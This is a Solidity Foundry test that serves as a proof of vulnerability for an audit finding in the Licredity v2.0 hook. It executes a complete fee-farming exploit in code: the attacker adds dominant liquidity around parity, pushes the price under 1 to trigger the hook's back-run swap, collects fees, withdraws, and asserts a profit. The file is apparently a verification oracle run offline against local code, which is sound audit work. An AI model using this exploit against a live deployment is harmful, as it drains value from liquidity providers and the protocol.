// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// Proof of Vulnerability for finding 62349 (Cyfrin H-1, Licredity v2.0):
// "Self-triggered _afterSwap back-run enables LP fee farming".
//
// When a swap pushes the pool price to 1 or below, _afterSwap automatically
// runs a second swap (the back-run) to push the price back up. That back-run
// pays swap fees to liquidity providers. An attacker who owns most of the
// liquidity around parity can push the price just under 1, collect the fees
// from both the push swap and the back-run, then remove the liquidity and
// walk away with more value than they started with.
//
// This test runs the attack and checks that the attacker ends up richer. On the
// vulnerable code the attack is profitable, so the test PASSES. The fix removes
// the back-run and reverts any swap that would end below 1, so the push swap
// reverts and the test FAILS. That difference is what makes this a real oracle.
//
// Source: data_collection/tier1_after_2025-08-31/62349.md (published Cyfrin PoC,
// adapted verbatim). Runs only offline, against local audited code.

import {Deployers} from "./utils/Deployer.sol";
import {Licredity} from "src/Licredity.sol";
import {IERC20} from "@forge-std/interfaces/IERC20.sol";
import {console} from "@forge-std/console.sol";
import {PoolKey} from "@uniswap-v4-core/types/PoolKey.sol";
import {Currency} from "@uniswap-v4-core/types/Currency.sol";
import {TickMath} from "@uniswap-v4-core/libraries/TickMath.sol";
import {IHooks} from "@uniswap-v4-core/interfaces/IHooks.sol";
import {IPoolManager} from "@uniswap-v4-core/interfaces/IPoolManager.sol";
import {StateLibrary} from "@uniswap-v4-core/libraries/StateLibrary.sol";

contract PoV62349_Licredity is Deployers {
    using StateLibrary for IPoolManager;

    uint24 private constant FEE = 100;
    int24 private constant TICK_SPACING = 1;
    uint160 private constant ONE_SQRT_PRICE_X96 = 0x1000000000000000000000000;

    PoolKey public poolKey;

    function setUp() public {
        deployETHLicredityWithUniswapV4();
        deployAndSetOracleMock();
        deployLicredityRouter();
        deployUniswapV4Router();

        poolKey = PoolKey(
            Currency.wrap(address(0)), Currency.wrap(address(licredity)), FEE, TICK_SPACING, IHooks(address(licredity))
        );
    }

    function test_abuse_backswap_fees() public {
        address attacker = makeAddr("attacker");

        // fund attacker with ETH and mint some debt for LP positions
        vm.deal(attacker, 1000 ether);
        getDebtERC20(attacker, 50 ether);

        // Fund the router's native balance so it can settle the ETH legs of the
        // attacker's liquidity adds and swaps. The mini-router pays native
        // settlements out of its own balance (see V4MiniRouter._settleAll), so
        // this ETH never enters the attacker's balance and does not affect the
        // profit accounting below. This mirrors the vm.deal pattern the project's
        // own LicredityHook tests use to fund the router.
        vm.deal(address(uniswapV4Router), 1000 ether);

        vm.startPrank(attacker);
        IERC20(address(licredity)).approve(address(uniswapV4Router), type(uint256).max);

        // 1) Attacker adds dominant narrow liquidity around parity on BOTH sides:
        //    below 1  -> captures fees while price dips (push leg + back-run leg)
        //    above 1  -> recoups the tiny portion of fees paid just above 1 when crossing
        int256 L_below = 40_000 ether;
        int256 L_above = 10_000 ether;

        // Record attacker balances before attack
        uint256 baseBefore = attacker.balance;
        uint256 debtBefore = IERC20(address(licredity)).balanceOf(attacker);

        // below 1: [-2, 0]
        uniswapV4RouterHelper.addLiquidity(
            attacker,
            poolKey,
            IPoolManager.ModifyLiquidityParams({tickLower: -2, tickUpper: 0, liquidityDelta: L_below, salt: ""})
        );

        // above 1: [0, +2]
        uniswapV4RouterHelper.addLiquidity(
            attacker,
            poolKey,
            IPoolManager.ModifyLiquidityParams({tickLower: 0, tickUpper: 2, liquidityDelta: L_above, salt: ""})
        );
        vm.stopPrank();

        // 2) Ensure starting price is a hair > 1 so we cross down through 1 on the push.
        //    Do a tiny oneForZero (debt -> base) to nudge price up.
        uniswapV4RouterHelper.oneForZeroSwap(
            attacker,
            poolKey,
            IPoolManager.SwapParams({
                zeroForOne: false, // debt -> base
                amountSpecified: int256(0.001 ether), // exact-in (tiny)
                sqrtPriceLimitX96: TickMath.getSqrtPriceAtTick(3)
            })
        );
        {
            (uint160 sqrtP0,,,) = poolManager.getSlot0(poolKey.toId());
            assertGt(sqrtP0, ONE_SQRT_PRICE_X96, "price should start slightly > 1");
        }

        vm.startPrank(attacker);
        // 3) The attacker does the push: base -> debt (zeroForOne), exact-out debt,
        //    with a limit just below 1 so we do cross into price<=1 and trigger the hook's back-run.
        int256 debtOut = 2 ether;
        for (uint256 i = 0; i < 1; i++) {
            uniswapV4RouterHelper.zeroForOneSwap(
                attacker,
                poolKey,
                IPoolManager.SwapParams({
                    zeroForOne: true, // base -> debt
                    amountSpecified: -debtOut, // exact-out debt
                    sqrtPriceLimitX96: TickMath.getSqrtPriceAtTick(-3)
                })
            );
        }
        // hook's back-run (debt -> base, exact-out base) runs inside afterSwap

        // Price should be restored to >= 1 by the hook's back-run
        {
            (uint160 sqrtP1,,,) = poolManager.getSlot0(poolKey.toId());
            assertGe(sqrtP1, ONE_SQRT_PRICE_X96, "post back-run price must be >= 1");
        }

        // 4) Pull the fees: remove BOTH attacker positions to collect base + debt fees.
        uniswapV4RouterHelper.removeLiquidity(
            attacker,
            poolKey,
            IPoolManager.ModifyLiquidityParams({tickLower: -2, tickUpper: 0, liquidityDelta: -L_below, salt: ""})
        );
        uniswapV4RouterHelper.removeLiquidity(
            attacker,
            poolKey,
            IPoolManager.ModifyLiquidityParams({tickLower: 0, tickUpper: 2, liquidityDelta: -L_above, salt: ""})
        );
        vm.stopPrank();

        // Attacker balances AFTER
        uint256 baseAfter = attacker.balance;
        uint256 debtAfter = IERC20(address(licredity)).balanceOf(attacker);

        // 5) Value both legs ~at parity (1 debt ~= 1 base). Because the price is ~1,
        //    this notional comparison is a good proxy for profit from the fee mining.
        uint256 notionalBefore = baseBefore + debtBefore;
        uint256 notionalAfter = baseAfter + debtAfter;

        // Expect positive drift from:
        //  - near-100% recoup of taker fees (attacker dominates both sides around 1)
        //  - plus back-run fees (paid in debt) captured below 1
        assertGt(notionalAfter, notionalBefore, "drain should be profitable when attacker dominates both sides");
        console.log("Profit from fee mining drain: %s", notionalAfter - notionalBefore);
    }

    receive() external payable {}
}
